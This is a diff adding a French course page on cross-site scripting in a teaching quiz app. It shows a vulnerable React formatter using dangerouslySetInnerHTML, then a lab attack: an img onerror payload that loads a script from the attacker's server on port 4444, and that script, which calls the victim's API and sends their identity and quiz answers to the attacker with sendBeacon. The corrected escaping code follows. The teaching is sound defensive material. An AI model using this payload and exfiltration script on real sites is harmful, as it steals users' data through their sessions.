@@ -1,0 +1,151 @@
+---
+sidebar_position: 2
+sidebar_label: Le XSS
+description: "Quand le texte d'un utilisateur devient du HTML exécuté chez un autre : la description de questionnaire de Quiz M9, dangerouslySetInnerHTML, et l'échappement qui ferme la faille."
+---
+
+# Le XSS
+
+La semaine 6 ajoute une **description** aux questionnaires, affichée dans le
+catalogue. On y accepte un peu de mise en forme, `**gras**` et `*italique*`,
+transformée en HTML :
+
+```js title="client/app/format.js (version vulnérable)"
+export function formatDescription(text) {
+  return text
+    .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
+    .replace(/\*(.+?)\*/g, '<em>$1</em>');
+}
+```
+
+Le catalogue insère ce HTML dans la page :
+
+```jsx title="client/app/routes/catalogue.jsx"
+<p dangerouslySetInnerHTML={{ __html: formatDescription(quiz.description) }} />
+```
+
+`dangerouslySetInnerHTML` porte bien son nom. Normalement, React échappe
+tout ce qu'on affiche : écrire `{quiz.description}` dans le JSX afficherait
+`<strong>` comme du **texte**, pas comme une balise. `dangerouslySetInnerHTML`
+court-circuite cette protection et insère la chaîne comme du **vrai HTML**.
+C'est le seul moyen d'obtenir du gras, et c'est aussi la porte du XSS.
+
+## Le mécanisme
+
+**XSS** veut dire *cross-site scripting* : faire exécuter, dans la page d'un
+autre utilisateur, du code que l'attaquant a déposé. Ici, la description
+d'un questionnaire est écrite par une personne et **lue par toutes les
+autres** dans le catalogue.
+
+`formatDescription` ne transforme que `*`. Tout le reste du texte est
+recopié tel quel dans le HTML. Une description contenant une balise
+`<script>`, ou un attribut d'événement sur une balise comme `<img>`, n'est
+donc pas affichée comme du texte : elle est **insérée comme du HTML**, et le
+navigateur de chaque visiteur l'exécute. Le code s'exécute dans **leur**
+session, pas celle de l'auteur.
+
+Ce que ce code peut faire, c'est tout ce que la page peut faire : lire ce
+qui est affiché, appeler l'API au nom de la victime, envoyer des données
+ailleurs. Le cookie de session, lui, est marqué `HttpOnly` (voir [La
+session](/notes_de_cours/auth/session)) : `document.cookie` ne le voit pas,
+donc le XSS ne le **vole** pas. Mais il n'en a pas besoin pour agir : le
+navigateur de la victime joint l'API avec ce cookie tout seul.
+
+## Une attaque réaliste : voler dans la session
+
+Une autrice malveillante, **Alice**, lance son propre serveur, sur une autre
+machine (ici, le port 4444 du poste). Le dépôt en fournit un dans
+`attacks/xss-collector.js` :
+
+```bash
+node attacks/xss-collector.js
+```
+
+Puis, connectée à Quiz M9 comme n'importe quelle autrice, Alice crée un
+questionnaire et lui donne une description qui charge, chez chaque visiteur,
+un script hébergé sur son serveur :
+
+```html
+<img src=x onerror="s=document.createElement('script');s.src='http://localhost:4444/vol.js';document.body.append(s)">
+```
+
+La balise `<img>` a une source invalide : son `onerror` s'exécute et ajoute
+une balise `<script>` qui va chercher `vol.js` chez Alice. La description
+reste courte ; toute la logique du vol vit sur le serveur pirate.
+
+`vol.js` tourne dans la page de la victime. Ses appels `/api` partent donc
+**avec le cookie de session**, sans jamais le lire :
+
+```js title="http://localhost:4444/vol.js"
+const json = (chemin) => fetch(chemin).then((r) => (r.ok ? r.json() : null));
+const moi = await json('/api/me');                        // qui est connecté
+const mesQuizzes = (await json('/api/me/quizzes')) ?? []; // ses questionnaires
+// Le détail de chacun, avec la bonne réponse de chaque question en clair.
+const butin = await Promise.all(mesQuizzes.map((q) => json('/api/quizzes/' + q.id)));
+navigator.sendBeacon('http://localhost:4444/', JSON.stringify({ moi, butin }));
+```
+
+Quiconque, connecté, ouvre le catalogue exécute ce code dans **sa** session.
+Le serveur pirate reçoit le tout et l'affiche sur `http://localhost:4444/` :
+l'identité de la victime, et ses questionnaires **bonnes réponses en clair**.
+Un autre utilisateur ne verrait jamais ces données ; le cookie de la victime,
+lui, y donne accès, et le XSS s'en sert en son nom.
+
+Le cookie n'a pas quitté le navigateur : `HttpOnly` et `SameSite` ont tenu.
+Ils protègent le cookie, pas les données que ce cookie déverrouille.
+
+## La correction : échapper avant de mettre en forme
+
+Le problème n'est pas la mise en forme, c'est que le texte de l'utilisateur
+arrive brut dans le HTML. La parade : **transformer d'abord** les caractères
+qui ont un sens en HTML en leur équivalent inoffensif, **puis** ajouter nos
+propres balises.
+
+```js title="client/app/format.js (corrigé)"
+export function formatDescription(text) {
+  return escapeHtml(text)
+    .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
+    .replace(/\*(.+?)\*/g, '<em>$1</em>');
+}
+
+/** Les cinq caractères qui ont un sens en HTML, remplacés par leur entité. */
+function escapeHtml(text) {
+  return text
+    .replaceAll('&', '&amp;')
+    .replaceAll('<', '&lt;')
+    .replaceAll('>', '&gt;')
+    .replaceAll('"', '&quot;')
+    .replaceAll("'", '&#39;');
+}
+```
+
+L'ordre compte deux fois :
+
+- **`&` en premier.** Sinon `<` devient `&lt;`, puis le `&` de `&lt;`
+  devient `&amp;lt;` : la page afficherait le texte `&lt;` au lieu de `<`.
+- **Échapper avant d'ajouter nos balises.** Nos `<strong>` sont ajoutés
+  *après* l'échappement : ils restent de vraies balises. Un `<` tapé par
+  l'utilisateur, lui, est déjà devenu `&lt;` : il s'affiche, il n'exécute
+  rien.
+
+Après correction, une description contenant `<` ou une balise s'affiche
+comme du texte, telle qu'elle a été tapée, et `**gras**` reste en gras.
+
+## La règle
+
+> **Une donnée qui vient de l'extérieur ne devient jamais du HTML sans être
+> échappée d'abord.**
+
+C'est la même règle que pour [l'injection SQL](injection_sql), appliquée à
+un autre langage : là, la donnée devenait du SQL ; ici, elle devient du
+HTML. Dans les deux cas, le remède est de garder la donnée du côté des
+données.
+
+## Pour aller plus loin
+
+Échapper à la main marche, mais reste fragile : une mise en forme plus riche
+(des listes, des liens) demanderait un analyseur complet. Il est plus simple de
+stocker le texte brut et on le rendre avec une bibliothèque qui **échappe puis
+met en forme** (par exemple un moteur Markdown avec l'assainissement activé).
+Le principe ne change pas : la donnée est traitée comme de la donnée, la mise
+en forme vient d'un code de confiance.
